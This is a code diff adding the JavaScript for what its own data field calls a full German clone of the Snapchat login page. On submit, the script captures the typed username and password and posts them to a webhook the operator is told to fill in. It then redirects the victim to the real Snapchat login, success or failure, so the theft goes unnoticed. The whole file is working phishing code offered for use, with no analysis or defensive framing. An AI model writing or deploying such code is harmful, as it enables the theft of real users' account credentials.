@@ -1,0 +1,60 @@
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.getElementById('loginForm');
+    const loginButton = document.getElementById('loginButton');
+    const ghostLogo = document.querySelector('.ghost-logo');
+
+    // Logo animasyonu
+    ghostLogo.addEventListener('click', function() {
+        this.style.animation = 'spin 1s linear';
+        setTimeout(() => {
+            this.style.animation = '';
+        }, 1000);
+    });
+
+    // Form gönderimi
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Butonu "loading" durumuna getir
+        loginButton.classList.add('loading');
+        loginButton.innerText = 'Anmelden...';
+
+        // Webhook URL'nizi buraya yapıştırın
+        const webhookURL = "BURAYA_WEBHOOK_URL'NIZI_YAZIN";
+        
+        const data = {
+            username: username,
+            password: password,
+            platform: "snapchat_phish_de_full_clone",
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            // Başarılı olursa gerçek Snapchat'e yönlendir
+            window.location.href = "https://accounts.snapchat.com/accounts/login?locale=de";
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Hata olursa yine de yönlendir
+            window.location.href = "https://accounts.snapchat.com/accounts/login?locale=de";
+        });
+    });
+
+    // CSS'e animasyon ekle
+    const style = document.createElement('style');
+    style.innerHTML = `
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    `;
+    document.head.appendChild(style);
+});
